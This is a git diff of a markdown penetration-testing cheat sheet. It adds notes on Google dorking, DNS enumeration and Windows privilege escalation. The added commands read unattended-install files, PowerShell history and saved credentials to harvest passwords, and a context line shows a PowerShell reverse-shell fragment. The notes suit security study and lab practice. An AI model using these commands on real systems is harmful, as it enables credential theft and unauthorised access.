@@ -82,6 +82,10 @@ $client = New-Object System.Net.Sockets.TCPClient('$(ip)',$(port));$stream = $cl
 
 # Passive Recon
 
+## Google Dorking
+
+[Dorksearch](https://dorksearch.com/) is used for google dorking and helps with the faster and more accurate resulets.
+
 ## Some Baic commands
 
 - `whois` tells info about a domain
@@ -102,7 +106,6 @@ Dns is just a database responsible for routing ip address to domain names.
   host $(website)
   ```
 
-````
 This commmand helps in finding the ip address of a domain and also helps in finding different types of webservers and their ips too.
 you can specify the type of web server with the help of -t flag
 
@@ -110,15 +113,18 @@ you can specify the type of web server with the help of -t flag
 
 This is an amazing technique which will basically tranfer the whole zone file of domain onto anyserver if misconfigured by sysadmins.
 We can find out the domain servers by
+
 ```bash
 host -t ns $(domain)
-````
+```
 
 But The best tool for gathering info about domain is dnsenum
 
 ```bash
 dnsenum $(domain)
 ```
+
+There are several tools in Kali Linux that can automate DNS enumeration.
 
 ## Portscanning
 
@@ -304,6 +310,40 @@ Powershell Commands
 
 
 
+## Unattended Windows Installations
+
+- C:\Unattend.xml
+- C:\Windows\Panther\Unattend.xml
+- C:\Windows\Panther\Unattend\Unattend.xml
+- C:\Windows\system32\sysprep.inf
+- C:\Windows\system32\sysprep\sysprep.xml
+
+As part of these files, you might encounter credentials:
+
+```
+<Credentials>
+    <Username>Administrator</Username>
+    <Domain>thm.local</Domain>
+    <Password>MyPassword123</Password>
+</Credentials>
+```
+
+## Checking the powershell history
+
+We can check the powershell history using:
+
+```bash
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+## Saved Windows Credentials
+
+Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
+
+```bash
+cmdkey /list
+```
+
 # Windows persistence
 
 ## Abusing unprivelleged users
@@ -466,7 +506,7 @@ We can use the following tools for passing the hashes
 
 - smbclient
 - CrackMapExec
-- impacket\_
+- impacket
 - psexec.py
 - wmiexec.py
 
@@ -489,3 +529,10 @@ Steps:
 EIP register holds the address of what is being executed (in this case the main function).
 
 Heap is where you can allocate large chunks of memory, Heap and stack both moves opposite to each other.
+
+
+
+
+
+
+
